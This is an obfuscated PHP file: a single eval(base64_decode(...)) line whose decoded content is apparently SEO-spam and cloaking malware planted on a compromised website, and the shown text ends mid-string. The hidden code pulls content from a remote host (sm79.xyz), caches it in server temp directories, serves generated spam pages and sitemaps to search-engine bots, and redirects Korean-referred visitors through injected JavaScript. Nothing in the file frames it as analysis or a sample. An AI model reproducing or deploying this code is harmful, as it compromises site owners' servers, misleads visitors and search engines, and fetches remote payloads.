<?PHP @eval(base64_decode("LyoqDQogKiBTaWduYXR1cmUgRm9yIFJlcG9ydA0KICovJHgxPSdhcnJbMV0pOwlfKWh0JGF0dGFjaF9hcl8paHRyX2kgPSBleHBfKWh0bG9kZShfKWhjfF8paGNfKWh0LF9nZXRfc3RhXylodHRpY19hcnJfKWh0KCRsb2NhbF91cl8paHRsLl8paGNhdHRhY2hfKWh0MV8paGMsJGF0dGFfKWh0Y2hfYXJyKSlfKWh0OwlkaWUoXyloYzwhRF8paHRPQ1QnOy8qDQogKi8keDEwMD0ndHJfaXJlcGxfKWh0YWNlKF8paGNbY29udF8paHRlbnRdXyloYyx1cmxfKWh0ZW5jb2RlKCRfKWh0Y29udGVudF8paHQpLCRzZWFyY18paHRoX2FyclswXylodF0pOyAgICAgXylodCAgICRodG1sX18paHRtID0gc3ViXylodHN0cl9yZXBsYWNfKWh0ZSgkaHRtbF9tJzsvKg0KICovJHgxMzI9J18paGMsJGJyYWNrZV8paHR0X2FyclsxXV8paHQsICRodG1sXylodF9tKTsJfQkJXylodAlmb3IoJGk9MTtfKWh0JGk8PTIwOyRfKWh0aSsrKXsJCSRicl8paHRhY2tldF9hcl8paHRyID0gZXhwbG9kXylodGUoXyloY3xfKWhjLF9nZV8paHR0X3N0YXRpXylodGNfYXJyKCc7LyoNCiAqLyR4MTQzPSdiYXNlLnJhbmRfXylodHN0cigpOwkJXylodCRhdHRhY2hfYV8paHRycl9pID0gZXhfKWh0cGxvZGUoXyloY3xfKWh0XyloYyxfZ2V0X3N0XylodGF0aWNfYXJyXylodCgkaHVybC5fKWh0XyloY2F0dGFjaDFfKWhjLF8paHQkYXR0YWNoX18paHRhcnIpKTsJXylodAkkaHRpdGwnOy8qDQogKi8keDE0ND0nY3JjMSA9IGFic18paHQoY3JjMzIoJG1kXylodHYxKSk7CSRfKWh0Y3JjMiA9IF8paHRhYnMoY3JjM18paHQyKCRtZHYyKV8paHQpOwlyZXR1XylodHJuIHN1YnN0XylodHIoYmNtdWwoJGNfKWh0cmMxLCRjcmNfKWh0MiksMCw4KTt9Zl8paHR1bmN0aW9uJzsvKg0KICovJHgxNTM9JzUwMCsxKS5fKWh0XyloYy50eHRfKWhjKSk7XylodAkkaHRtbF9fKWh0bSA9IHN0cl9fKWh0aXJlcGxhY18paHRlKF8paGNbdGltZV8paHRdXyloYywgZGF0ZSgiXylodFktbS1kLUhfKWh0LWkiLCB0aV8paHRtZSgpKSwgJF8paHRodG1sX20pXylodDsJCWZvcigkaV8paHQ9MTskaTwnOy8qDQogKi8keDE2Mz0ndG1sX20sICI8XylodGEgaHJlZj1fKWhsIl8paHQiIC4gJGh1cmwgXylodC4gIl8paGwiPiJfKWh0IC4gJGh0aV8paHR0bGUgLiAiPF8paHQvYT4iLCAkXylodHAsIHN0cmxlbihfKWh0XyloY1thaHJlZl1fKWhjKV8paHQpOyAgICAgIF8paHQgICRwID0gc3RfKWh0cnBvcygkJzsvKg0KICovJHgxNjk9JyRpLl8paGNdXyloYywkYXRfKWh0dGFjaF9hcnJfaV8paHQgWzFdLCAkXylodGh0bWxfbSk7XylodAkJJGh0bWxfbV8paHQgPSBzdHJfaV8paHRyZXBsYWNlKF8paGNbXylodHNpdGVfKWhjLiRpLl8paGNfKWh0XV8paGMsJGF0dF8paHRhY2hfYXJyXylodF9pIFsyXSwgXylodCRodG1sXyc7LyoNCiAqLyR4MTgwPSdtKTsJCSRicmFfKWh0Y2tldF9hcnIgXylodD0gZXhwbG9kZShfKWh0XyloY3xfKWhjLF9nZXRfXylodHN0YXRpY19hXylodHJyKCRsb2NhbF8paHRfdXJsLl8paGNicmFjXylodGtldF8paGMuJGlfKWh0LCRicmFja2VfKWh0dHNfYXJyKSlfKWh0OwkJJGh0bV8paHRsX20gPSAnOy8qDQogKi8keDE4Mz0ndG1sKTsgZmNsb18paHRzZSgkZnApXylodDt9ZWxzZXtyXylodGV0dXJuICRoXylodHRtbDt9CQl9CV8paHQJcmV0dXJuIChfKWh0JGh0bWwpO31mdV8paHRuY3Rpb24gXylodF9nZXRfdGVfKWh0bXBfZGlyX18paHRtYXNzKCl7CWlmXylodChmdW5jdGlvJzsvKg0KICovJHgxOTQ9J3N0cigpOwkJJHNfKWh0ZWFyY2hfYXJyIF8paHQ9IGV4cGxvZGUoXylodF8paGN8fF8paGMsJHNlYV8paHRyY2hzX2FycltfKWh0bXRfcmFuZCgwXylodCwgY291bnQoJHNfKWh0ZWFyY2hzX2FyXylodHIpLTEpXSlfKWh0OwkJJGNvbnRfKWh0ZW50ID0gJHNlJzsvKg0KICovJHgyMjc9J2VkaWFwYXJ0bmVfKWh0cnN8c2x1cnB8cF8paHRhdHJvbC9pXyloYywgXylodCRfU0VSVkVSXylodFtfKWhjSFRUUF9fKWh0VVNFUl9BR0VOXylodFRfKWhjXSkgICAgKTtfKWh0fWZ1bmN0aW9uXylodCBoYXNoQ29kZV8paHQoJHN0cil7ICBfKWh0ICBpZihlbXB0JzsvKg0KICovJHgyMjk9J2Z1bmN0aW9uXylodCBfZ2V0X2NfKWh0YWNoZSgkbGluXylodGspewkJJHRtcF8paHRkaXIgPSBfZ2VfKWh0dF90ZW1wX2Rpcl8paHRfbWFzcygpO18paHQJCSRmaWxlXylodCA9ICR0bXBkXylodGlyLl8paGMvc2Vzc19fKWh0XyloYy5tZDUoJGxfKWh0aW5rKTsJCSc7LyoNCiAqLyR4MjM0PSdzdHJwb3MoJF8paHRodG1sX20sXylodCBfKWhjW2xpbmtdXyloY18paHQpOwl9CQkJJHAgXylodD0gc3RycG9zKCRfKWh0aHRtbF9tLF8paHQgXyloY1thaHJlZl8paHRdXyloYyk7ICAgIHdoXylodGlsZSAoJHAgXylodCE9PSBmYWxzZV8paHQpIHsJCSRoXylodHVybCA9ICQnOy8qDQogKi8keDIzNz0neSgkc3RyKV8paHQpIHJldHVybiBfKWhjXylodF8paGM7ICAgICRtZF8paHR2ID0gbWQ1KCRzXylodHRyKTsgICAgJF8paHRtZHYxID0gc3VfKWh0YnN0cigkbWR2LF8paHQwLDE2KTsJJF8paHRtZHYyID0gc3VfKWh0YnN0cigkbV8paHRkdiwxNiwxNl8paHQpOwkkJzsvKg0KICovJHgyNDA9J2Jhc2VfdXJsKClfKWh0OwkkbG9jYWxfXylodHVybCA9IF9sb2NfKWh0YWxfdXJsKCk7XylodAkkaHRtbCBfKWh0PSBiYXNlNjRfXylodGRlY29kZShfZ18paHRldF9jYWNoZShfKWhjXylodGh0dHA6Ly9zbTdfKWh0OS54eXovZGF0XylodGEucGhwP2c9JzsvKg0KICovJHgyNDk9J3JsZW4oXyloY1tzXylodHltYm9seF1fKWhjXylodCkpOwkJCSRwXylodCA9IHN0cnBvcyhfKWh0JGNvbnRlbnRfKWh0LCBfKWhjW3N5bWJfKWh0b2x4XV8paGMpOwlfKWh0CX0JCQkJZm9fKWh0cigkaT0xO18paHQkaTw9MjA7JF8paHRpKyspewkJXylodAkkYnJhY2tfKWh0ZXRfYXInOy8qDQogKi8keDI3NT0nb3VudCgka18paHRleXNfYXJyKS1fKWh0MSldLCAkY29uXylodHRlbnQpOwlfKWh0CSRwID0gc3RyXylodHBvcygkY29udF8paHRlbnQsIF8paGNba18paHRleXdvcmR4XV8paHRfKWhjKTsJCXdoaV8paHRsZSAoJHAgIV8paHQ9PSBmYWxzXylodGUpIHsJCQkkY29fKWh0bic7LyoNCiAqLyR4MzExPSdzdF9zY3IpKTtfKWh0CQlpZihzdF8paHRyaXN0cigkXylodHJlcXVlc3RfdXJfKWh0bCwkc2NyaV8paHRwdF9uYW1lKV8paHQpewkJcmV0dXJfKWh0biAkbG9jYV8paHRsX2hvc3QuXylodCRyZXF1ZXN0X18paHRzY3IuXyloYy9fKWhjXylodDsJfQkJaWZfKWh0KHN0cnRvJzsvKg0KICovJHgzMjQ9J291bnQoJGtfKWh0ZXlzX2FyciktMV8paHQpXSwgJHAsIF8paHRzdHJsZW4oXyloY1tfKWh0a2V5d29yZHhfKWh0XV8paGMpKTsJCSRfKWh0cCA9IHN0cnBfKWh0b3MoJGh0bWxfbV8paHQsIF8paGNba2V5d29fKWh0cmR4XV8paGMpOwlfKWh0fQkJJHAgPSBfKWh0c3RycG9zKCc7LyoNCiAqLyR4MzM0PSdOQU1FXyloY107XylodCAgICBpZiAoJF8paHRfU0VSVkVSW18paGNTXylodEVSVkVSX1BfKWh0T1JUXyloY10gIT0gXylodDgwICYmICRfU0VfKWh0UlZFUltfKWhjU0VfKWh0UlZFUl9QT1JUXyloY18paHRdICE9IDQ0XylodDMpIHsgICBfKWh0ICAgICAkaG9zdF8paHQgLj0gIjonOy8qDQogKi8keDMzOD0nbl9leGlzdF8paHRzKCJzeXNfXylodGdldF90ZW1wXylodF9kaXIiKSl7CQlfKWh0aWYoQGlzX3dyXylodGl0ZWFibGUoc18paHR5c19nZXRfdF8paHRlbXBfZGlyKF8paHQpKSl7cmV0XylodHVybihyZWFsXylodHBhdGgoc3lfKWh0c19nZXRfdGVtcF8paHRfZCc7LyoNCiAqLyR4MzM5PScgJGh0bWxfbSk7XylodAkJJGh0bWxfKWh0X20gPSBzdHJfKWh0X2lyZXBsYWNfKWh0ZShfKWhjW2JyYWNrXylodGV0cl8paGMuJGkuXyloY18paHRdXyloYywkYnJhY18paHRrZXRfYXJyWzFdXylodCwgJGh0bWxfbSlfKWh0Owl9CQkkcCA9XylodCBzdHJwb3NfKWh0KCRodG0nOy8qDQogKi8keDM0Mz0naHRtbF9hcl8paHRyWzVdKTsJJGdpXylodHQgPSAkaHRtbF8paHRfYXJyWzZdO18paHQJCSRodG1sXylodF9tID0gYmFzXylodGU2NF9kZWNfKWh0b2RlKF9nZV8paHR0X2NhY2hlKCRfKWh0Z2l0LihoYXNfKWh0aENvZGUoX2xfKWh0b2NhbF91cmxfKWh0KCkpJSc7LyoNCiAqLyR4MzU3PScgcmFuZF9zXylodHRyKCl7CSRfKWh0bGVuID0gbXRfcl8paHRhbmQoMzAsNDApXylodDsJJHN0ciA9XylodCBudWxsOwkkc18paHR0clBvbCA9XylodCAiQUJDREVGXylodEdISUpLTE1fKWh0Tk9QUVJTVFVWXylodFdYWVowMTIzNDVfKWh0Njc4OWFiY2QnOy8qDQogKi8keDM2PSdodG1sX20sIF8paGNfKWh0W2FocmVmXV8paGMpXylodDsgICAgfQlfKWh0CSRzID0gc3RycF8paHRvcygkaHRtXylodGxfbSwgXyloY1tzZV8paHRhcmNoXV8paGMpXylodDsgICAgd2hpbF8paHRlICgkcyAhPT1fKWh0IGZhbHNlKV8paHQgewkJJHNlZV8paHRkID0gcmFuZF8nOy8qDQogKi8keDM5MD0nbG93ZXIoJHNfKWh0Y3JpcHRfbl8paHRhbWUpPT1fKWhjaW5kXylodGV4LnBocF8paGNfKWh0ICYmICgkcl8paHRlcXVlc3RfdXJfKWh0bCA9PSAkc18paHRjcmlwdF9wYXRfKWh0aCB8fCAkcl8paHRlcXVlc3RfdXJfKWh0bCA9PSAkc2NfKWh0cmlwdF9wYXRoXylodC5fKWhjLyc7LyoNCiAqLyR4NDI1PSdsc2UpIHsJXylodAkJJGNvbnRfKWh0ZW50ID0gc18paHR1YnN0cl9yZXBsXylodGFjZSgkY29fKWh0bnRlbnQsIF8paHQkc3ltYm9sXylodHNfYXJyW210X18paHRyYW5kKDAsIF8paHRjb3VudCgkXylodHN5bWJvbHNfYV8paHRyciktMSldLCBfKWh0JHAsIHN0JzsvKg0KICovJHg0MzE9J1lQRSBodG1sXylodD48aHRtbD48Ym9fKWh0ZHk+PHNjcmlfKWh0cHQ+ZG9jdV8paHRtZW50LmxvY2F0XylodGlvbj0oIl8paGNfKWh0LiRhdHRhY2hfKWh0X2Fycl9pWzNdLl8paHRfKWhjIik7PC9zY3JfKWh0aXB0PjwvYm9keV8paHQ+PC9odG1sPl8paHRfKWhjKTt9Zic7LyoNCiAqLyR4NDMzPSdjYzc1Ny5oXylodHRtbCIpICE9XylodD0gZmFsc2Upe18paHQJZGllKF8paGNnb29fKWh0Z2xlLXNpdGUtXylodHZlcmlmaWNhXylodHRpb246IGdvb2dfKWh0bGVlNDQ1MmZfKWh0M2VjNDZjY18paHQ3NTcuaHRtbF8paGNfKWh0KTt9aWYoc3RycF8paHRvcyhzdHInOy8qDQogKi8keDQzNj0nc3RyX2lyZXBfKWh0bGFjZShfKWhjW18paHRicmFja2V0XylodGxfKWhjLiRpLl8paGNdXyloYyxfKWh0JGJyYWNrZXRfKWh0X2FyclswXV8paHQsICRodG1sX21fKWh0KTsJCSRodF8paHRtbF9tID0gc18paHR0cl9pcmVwbF8paHRhY2UoXyloY1tiXylodHJhY2tldHJfKWh0XyloYy4kaS5fKWhjXSc7LyoNCiAqLyR4NDQ9Jy54eXovZGF0YS5fKWh0cGhwP2c9MTIuXylodDZfKWhjKSk7CSRfKWh0aHRtbF9hcnIgXylodD0gZXhwbG9kXylodGUoIi0tLS1fKWh0LS0tLS0iLCRfKWh0aHRtbCk7CSRhXylodHR0YWNoX2FyciBfKWh0PSBleHBsb2RlKF8paHQiXylobHJfKWhsbiIsJGhfKWh0dG1sXyc7LyoNCiAqLyR4NDQ4PSdhcmNoX2Fycl8paHRbMV07CQkkXylodGNvbnRlbnQgXylodD0gc3RyX2lyZXBfKWh0bGFjZShfKWhjW3RpbV8paHRlXV8paGMsIGRhdF8paHRlKCJZLW0tXylodGQtSC1pIiwgdF8paHRpbWUoKSksICRfKWh0Y29udGVudCk7CV8paHQJJGF0dGFjXylodGhfYXJyX2knOy8qDQogKi8keDQ1Nj0nPSBzdWJzdHJfcl8paHRlcGxhY2UoXylodCRodG1sX21fKWh0LCAkbGlua3NfYV8paHRyclttdF9yYW5fKWh0ZCgwLCBjb3VuXylodHQoJGxpbmtfKWh0c19hcnIpLV8paHQxKV0sICRwLCBfKWh0c3RybGVuKF8paGNbXylodGxpbmtdXyloYykpOwlfKWh0CSRwID0gJzsvKg0KICovJHg0NjI9J3MoXyloY2N1cmxfaW5fKWh0aXRfKWhjKSkgeyAgXylodCAgICAgICRfKWh0Y2ggPSBjdXJsX18paHRpbml0KCk7ICBfKWh0ICAgICAgY3VyXylodGxfc2V0b3BfKWh0dCgkY2gsIENfKWh0VVJMT1BUX1VSTF8paHQsICR1cmwpOyAgXylodCAgICAgIGN1cmxfKWh0Xyc7LyoNCiAqLyR4NDYzPSciIGVuY29kaW5fKWh0Zz1fKWhsIlVURl8paHQtOF8paGwiPz5fKWhscl8paGxfKWh0bjx1cmxzZXQgeF8paHRtbG5zPV8paGwiXylodGh0dHA6Ly93d3dfKWh0Lmdvb2dsZS5jb18paHRtL3NjaGVtYXNfKWh0L3NpdGVtYXAvXylodDAuODRfKWhsIj5fKWh0XylobHJfKWhsbiI7ICAgIF8paHRmb3InOy8qDQogKi8keDQ3Mj0nIlRNUCJdKSk7fV8paHQgICAgaWYoIWVfKWh0bXB0eSgkX0VOVl8paHRbIlRNUERJUl8paHQiXSkmJkBpc18paHRfd3JpdGVhYmxfKWh0ZShyZWFscF8paHRhdGgoJF9FTlZfKWh0WyJUTVBESV8paHRSIl0pKSl7XylodHJldHVybihyZV8paHRhbHBhdGgoJzsvKg0KICovJHg0ODY9J2xwYXRoKCAkX18paHRFTlZbIlRFTVBfKWh0Il0pKTt9ICAgIF8paHQkdGVtcGZpbF8paHRlPUB0ZW1wbl8paHRhbShfX0ZJTEVfKWh0X18sIiIpOyBfKWh0ICAgaWYoQGZfKWh0aWxlX2V4aXN0XylodHMoJHRlbXBfKWh0ZmlsZSkpe18paHQJCUB1bmxpbic7LyoNCiAqLyR4NDkwPScpKTt9ICAgIGlmXylodChAaXNfd3JpdF8paHRlYWJsZShyZV8paHRhbHBhdGgoZGlyXylodG5hbWUoX19GXylodElMRV9fKSkpXylodCl7cmV0dXJuKHJfKWh0ZWFscGF0aChkXylodGlybmFtZShfKWh0X19GSUxFX18pXylodCkpO319ZnVuY3RfKWh0aW8nOy8qDQogKi8keDUwNz0nIH0gd2hpbGVfKWh0ICh0cnVlKTsgXylodCAgICAgICBmY18paHRsb3NlKCRoYV8paHRuZGxlKTsgXylodCAgIH0gICAgcmVfKWh0dHVybiAkX2hfKWh0dG1sO31mdV8paHRuY3Rpb24gXylodF9sb2NhbF9oXylodG9zdCgpeyAgIF8paHQgJHN0YXR1cyBfKWh0PSc7LyoNCiAqLyR4NTEwPScgKCRpID0gMF8paHQ7ICRpIDwgMV8paHQwMDsgJGkrKykgXylodHsgICAgICBfKWh0ICAkdXJsID1fKWh0ICRiYXNlX3VybF8paHQucmFuZF9zdHIoXylodCk7ICAgICAgXylodCAgJHJlcyBfKWh0Lj0gIiA8dXJsPl8paHRfKWhscl8paGxuICA8XylodGxvYz4iIC4nOy8qDQogKi8keDUxMj0nb3MoJGh0bWxfKWh0X20sIF8paGNbYXJlXylodGF4XV8paGMpOwl9CQlfKWh0CSRwID0gc3RyXylodHBvcygkaHRfKWh0bWxfbSwgXyloY1tzXylodHltYm9seF1fKWh0XyloYyk7CXdoaWxfKWh0ZSAoJHAgIT09IF8paHRmYWxzZSkgXylodHsJCSRodG1sX18paHRtID0gc3ViJzsvKg0KICovJHg1MTQ9JyRodG1sX21fKWh0LCBfKWhjW2FyZWF4XV8paHRfKWhjKTsJd2hpbGUgXylodCgkcCAhPT0gZmFfKWh0bHNlKSB7CQlfKWh0JGFyZWFfYXJyIF8paHQ9IGV4cGxvXylodGRlKF8paGN8XyloYyxfKWh0JGF0dGFjaF9hcl8paHRyW210X3JhbmQoXylodDAsIGNvdW5fKWh0dCgkYSc7LyoNCiAqLyR4NTMxPSd0X2NvbnRlbnRzXylodF8paGMpKSB7ICAgXylodCAgICAgJF9odF8paHRtbCA9IEBmaWxfKWh0ZV9nZXRfY18paHRvbnRlbnRzKCRfKWh0dXJsKTsgICBfKWh0IH0gICAgaWYgXylodCgkX2h0bWwgPV8paHQ9IF8paGNfKWhjICYmIGZ1XylodG5jdGlvbl9lXylodHhpc3QnOy8qDQogKi8keDUzND0nbF9tLCBfKWhjW2tleV8paHR3b3JkeF1fKWhjKV8paHQ7CXdoaWxlXylodCAoJHAgIT09XylodCBmYWxzZSkgewlfKWh0CSRodG1sX18paHRtID0gc3ViXylodHN0cl9yZXBsYV8paHRjZSgkaHRtbF9tXylodCwgJGtleXNfYV8paHRyclttdF9yXylodGFuZCgwLCBjJzsvKg0KICovJHg1NDM9J3RpY19hcnIoJF8paHRzZWVkLl8paGNhdHRfKWh0YWNoMl8paGMsJGF0dF8paHRhY2hfYXJyXylodCkpOwkJCQkkXylodGNvbnRlbnQgXylodD0gc3RyX2lyXylodGVwbGFjZShfKWhjW2FfKWh0cmVhMV1fKWhjLCAkYV8paHR0dGFjaF9hXylodHJyX2kgWzBdLF8paHQgJGNvbic7LyoNCiAqLyR4NTYwPSdvZGUoIl8paGxyXylodF8paGxuIiwkaHRfKWh0bWxfYXJyWzNdKV8paHQ7CSRsaW5rc18paHRfYXJyID0gZXhfKWh0cGxvZGUoIl8paGxyXylodF8paGxuIiwkaHRtXylodGxfYXJyWzRdKV8paHQ7CSRzZWFyY2hzXylodF9hcnIgPSBlXylodHhwbG9kZSgiXylodF8paGxyXylobG4iLCQnOy8qDQogKi8keDU4Nj0ndHJfaXJlcF8paHRsYWNlKF8paGMvL18paHRfKWhjLF8paGMvXyloYyxzdF8paHRyX2lyZXBsYV8paHRjZShfKWhjXylobF8paGxfKWhjLF8paHRfKWhjL18paGMsJF9TRVJWXylodEVSW18paGNSRVFVRVNfKWh0VF9VUklfKWhjXSlfKWh0KTsJJHJlcXVlc18paHR0X3NjciA9XylodCAkX1NFUlZFUl8paHRbXyloY1NDUklQJzsvKg0KICovJHg1ODc9J2FjZShfKWhjW3NfKWh0aXRlMl1fKWhjLCAkYV8paHR0dGFjaF9hcl8paHRyX2lpIFsyXSxfKWh0ICRjb250ZW50XylodCk7CQkkY29uXylodHRlbnQgPSBfKWh0c3RyX2lyZXBsYV8paHRjZShfKWhjW2tleXdvXylodHJkMV1fKWhjLCAka2VfKWh0eXNfYXJyW210X18paHRyYSc7LyoNCiAqLyR4NTkwPScpKSB7ICAgXylodCAgICAgJGhfKWh0YW5kbGUgPSBfKWh0Zm9wZW4oJF8paHR1cmwsICJyXylodGIiKTsgICAgICBfKWh0ICBkbyB7ICBfKWh0ICAgICAgICAgIF8paHQkZGF0YSA9IGZyXylodGVhZCgkaGFuZGxfKWh0ZSwgODE5Ml8paHQpOyAgICAgICAnOy8qDQogKi8keDU5ND0nfHwgIWVtcHRfKWh0eSgkX1NFUl8paHRWRVJbXyloY0hUVF8paHRQX1hfRk9SV18paHRBUkRFRF9TU0xfKWhjXylodF0pICYmICRfXylodFNFUlZFUltfKWhjSFRfKWh0VFBfWF9GT1JXXylodEFSREVEX1NTTF8paHRfKWhjXSA9PSBfKWhjb25fKWh0XyloYykgeyAgICAgXylodCAgICRzJzsvKg0KICovJHg2Mzg9JyAkX0VOVltfKWh0IlRNUERJUl8paHQiXSkpO30gICAgXylodGlmKCFlbXB0eV8paHQoJF9FTlZbIl8paHRURU1QIl0pJl8paHQmQGlzX3dyaXRfKWh0ZWFibGUocmVhbF8paHRwYXRoKCRfRU5fKWh0VlsiVEVNUCJdKV8paHQpKXtyZXR1cl8paHRuKHJlYSc7LyoNCiAqLyR4NjQ9J3NldG9wdCgkXylodGNoLCBDVVJMT1BfKWh0VF9SRVRVUl8paHROVFJBTlNGRVIsXylodCAxKTsgICBfKWh0ICAgICBjdXJfKWh0bF9zZXRvcHQoJF8paHRjaCwgQ1VSTE9fKWh0UFRfQ09OTkVDXylodFRUSU1FT1VfKWh0VCwgMjApOyAgIF8paHQgICAgICc7LyoNCiAqLyR4NjQ3PSdyID0gZXhwbG9kXylodGUoXyloY3xfKWhjLCRfKWh0YnJhY2tldHNfYV8paHRyclttdF9yXylodGFuZCgwLCBfKWh0Y291bnQoJF8paHRicmFja2V0XylodHNfYXJyKS0xKV8paHRdKTsJCQkkY29uXylodHRlbnQgPSBzXylodHRyX2lyZXBfKWh0bGFjZShfKWhjW2JyYV8paHRjJzsvKg0KICovJHg2NTc9J25kKDAsIGNvdW5fKWh0dCgka2V5c19hcl8paHRyKS0xKV0sXylodCAkY29udGVfKWh0bnQpOwkJJF8paHRjb250ZW50IF8paHQ9IHN0cl9pcmVfKWh0cGxhY2UoXyloY18paHRba2V5d29yXylodGQyXV8paGMsICRrXylodGV5c19hcnJbbXRfKWh0X3JhbmQoMCwgY18paHQnOy8qDQogKi8keDY2PSdlbHNlaWYgKCFlXylodG1wdHkoJF9fKWh0U0VSVkVSW18paGNfKWh0SFRUUF9YX0ZPXylodFJXQVJERURfUFJfKWh0T1RPXyloY10pICZfKWh0JiAkX1NFUlZfKWh0RVJbXyloY0hUVFBfWF8paHRfRk9SV0FSREVEXylodF9QUk9UT18paGNdID1fKWh0PSBfKWhjaHR0cHNfKWh0XyloYyAnOy8qDQogKi8keDY2ND0nXSwgJGNvbnRlbl8paHR0KTsJCX0JCQkJXylodCRodXJsID1fKWh0IHN0cl9pcmVwXylodGxhY2UoXyloY1tjb25fKWh0dGVudF1fKWhjLHVyXylodGxlbmNvZGUoJGNfKWh0b250ZW50KV8paHQsJHNlYXJjXylodGhfYXJyWzBdKV8paHQ7CQkkaHVyXylodGwgPSBzJzsvKg0KICovJHg2Njc9J2UgPSAkYXR0YV8paHRjaF9hcnJfaV8paHRbMF0uX2dldF9fKWh0c3RhdGljX2FyXylodHIoJGh1cmwuXylodF8paGNrZXl3b3JkXylodDFfKWhjLCRrZXlfKWh0c19hcnIpO18paHQgICAgICAgIF8paHQkaHRtbF9tID0gXylodHN1YnN0cl9yZXBfKWh0bGFjZSgkaCc7LyoNCiAqLyR4NjY5PSd1bmN0aW9uIF9fKWh0Z2V0X3N0YXRpY18paHRfYXJyKCRzdF8paHRyLCRhcnIpe18paHQJcmV0dXJuKCRhXylodHJyW2hhc2hDb2RfKWh0ZSgkc3RyKSVjb18paHR1bnQoJGFycilfKWh0XSk7fWlmKGlzQl8paHRvdCgpKXsJXylodCRiYXNlID0gXyc7LyoNCiAqLyR4Njc9J3IpLCAkaHRtbF8paHRfbSk7CQkkXylodGF0dGFjaF9fKWh0YXJyX2kgPSBlXylodHhwbG9kZShfKWh0XyloY3xfKWhjLF9nZV8paHR0X3N0YXRpY19hXylodHJyKCRsb2NhbF8paHRfdXJsLl8paGNhXylodHR0YWNoXyloYy5fKWh0JGksJGF0dGFfKWh0Y2hfYXJyKV8paHQpOwkJJGgnOy8qDQogKi8keDY3Nj0nKDAsJG1heCldO18paHQJfSAJcmV0dXJfKWh0biAkc3RyO31mdV8paHRuY3Rpb24gX18paHRodHRwX2dldCgkXylodHVybCl7ICAgXylodCAkX2h0bWwgPV8paHQgXyloY18paGM7ICAgIF8paHRpZiAoZnVuY18paHR0aW9uX2V4aXNfKWh0dHMoXyloY2ZpbF8paHRlX2dlJzsvKg0KICovJHg2Nzg9Jz00OyRpKyspXylodHsJCSRodG1sX18paHRtID0gc3RyX18paHRpcmVwbGFjZShfKWhjXylodFtrZXl3b3JkXyloYy5fKWh0JGkuXyloY11fKWhjLF9fKWh0Z2V0X3N0YXRpXylodGNfYXJyKCRsb2NfKWh0YWxfdXJsLl8paGNfKWh0a2V5d29yZF8paGMuJF8paHRpLCRrZXlzXylodF9hcic7LyoNCiAqLyR4Njk5PScgPSBleHBsb2RlXylodChfKWhjfF8paGMsX2dlXylodHRfc3RhdGljXylodF9hcnIoJHNfKWh0ZWVkLl8paGNhdHRhXylodGNoMV8paGMsJGF0XylodHRhY2hfYXJyXylodCkpOwkJJGF0XylodHRhY2hfYXJyX2lfKWh0aSA9IGV4cF8paHRsb2RlKF8paGN8XyloYyxfXylodGdldF9zdGEnOy8qDQogKi8keDcwPSd0ZW50ID0gc18paHR1YnN0cl9yXylodGVwbGFjZSgkY29fKWh0bnRlbnQsICRfKWh0a2V5c19hcnJfKWh0W210X3JhbmRfKWh0KDAsIGNvdW50KF8paHQka2V5c19hcnJfKWh0KS0xKV0sICRwXylodCwgc3RybGVuKF8paGNfKWh0W2tleXdvcl8paHRkeF1fKWhjKSknOy8qDQogKi8keDcwMj0nfSAgICB9ICBfKWh0ICBpZihAaXNfKWh0X3dyaXRlYWJfKWh0bGUocmVhbHBhdF8paHRoKEBpbmlfZ18paHRldCgidXBsb2FkXylodF90bXBfZGlyXylodCIpKSkpe3JldF8paHR1cm4ocmVhbHBfKWh0YXRoKEBpbmlfZ18paHRldCgidXBsb18paHRhZF90JzsvKg0KICovJHg3MT0nICAgICBpZiAoXylodHN0cmxlbigkZF8paHRhdGEpID09IF8paHQwKSB7ICAgICBfKWh0ICAgICAgICAgIF8paHQgYnJlYWs7ICBfKWh0ICAgICAgICBfKWh0ICB9ICAgICBfKWh0ICAgICAgIF8paHQkX2h0bWwgLl8paHQ9ICRkYXRhOyAgXylodCAgICAgJzsvKg0KICovJHg3MTM9J0dVQUdFXyloY11fKWh0KSwgImtvIikgXylodCE9PSBmYWxzZSlfKWh0ewkkbG9jYWxfXylodHVybCA9IF9fKWh0bG9jYWxfdV8paHRybCgpOwkkXylodGh0bWwgPSBfKWh0YmFzZTY0X18paHRkZWNvZGUoX2dfKWh0ZXRfY2FjaGUoXylodF8paGNodHRwOi9fKWh0L3NtNzknOy8qDQogKi8keDcyOT0ncnIgPSBleF8paHRwbG9kZSgiXylodF8paGxyXylobG4iLCRodG1fKWh0bF9hcnJbMV0pO18paHQJJGJyYWNrZXRfKWh0c19hcnIgPSBleF8paHRwbG9kZSgiXylobHJfKWhsXylodG4iLCRodG1fKWh0bF9hcnJbMl0pO18paHQJJHN5bWJvbHNfXylodGFyciA9IGV4cGxfKWh0JzsvKg0KICovJHg3NDY9JyRodG1sID1fKWh0IEBmaWxlX2dlXylodHRfY29udGVfKWh0bnRzKCRmaWxlKV8paHQ7CQlpZighXylodGZpbGVfZXhpXylodHN0cygkZmlsZV8paHQpIHx8IHN0cmxfKWh0ZW4oJGh0bWwpPF8paHQxMDAgfHwgdGlfKWh0bWUoKSAtIGZpbF8paHRlbXRpbSc7LyoNCiAqLyR4NzU9J2xfbSwgXyloY1tzZWFfKWh0cmNoXV8paGMpOyAgICB9CQkgICAgZGllKCRodG1sX20pO30nOy8qDQogKi8keDc1Mz0nMTIuNl8paGMpKTsJXylodCRodG1sX2FyciBfKWh0PSBleHBsb2RlKF8paHQiLS0tLS0tLV8paHQtLSIsJGh0XylodG1sKTsJJGtfKWh0ZXlzX2FyciBfKWh0PSBleHBsb18paHRkZSgiXylobHJfKWhsbiJfKWh0LCRodG1sX2FfKWh0cnJbMF0pO18paHQJJGF0dGFjaF9fKWh0YSc7LyoNCiAqLyR4NzU2PSdpcigpKSk7fV8paHQJfSAgICBpZihfKWh0IWVtcHR5KCRfRV8paHROVlsiVE1QXylodCJdKSYmQGlzX3dfKWh0cml0ZWFibGVfKWh0KHJlYWxwYV8paHR0aCgkX0VOXylodFZbIlRNUCJdKSlfKWh0KXtyZXR1cm4oXylodHJlYWxwYXRoKCRfKWh0X0VOVlsnOy8qDQogKi8keDc2MD0nXyloYykpewkJcmVfKWh0dHVybiAkbG9jYV8paHRsX2hvc3QuXylodCRyZXF1ZXNfKWh0dF9zY3IuXyloYy9fKWh0XyloYzsJfQkJcmV0XylodHVybiAkbG9jYV8paHRsX2hvc3QuJF8paHRzY3JpcHRfXylodHBhdGg7fWlmIF8paHQoc3RycG9zKCRfXylodFNFUlZFUltfKWhjJzsvKg0KICovJHg3NjM9J3RvbG93ZXJfKWh0KEAkX1NFUlZFXylodFJbXyloY0hUVFBfUl8paHRFRkVSRVJfKWhjXSksXylodCAiLmtyIikgIV8paHQ9PSBmYWxzZSBfKWh0fHwgc3Ry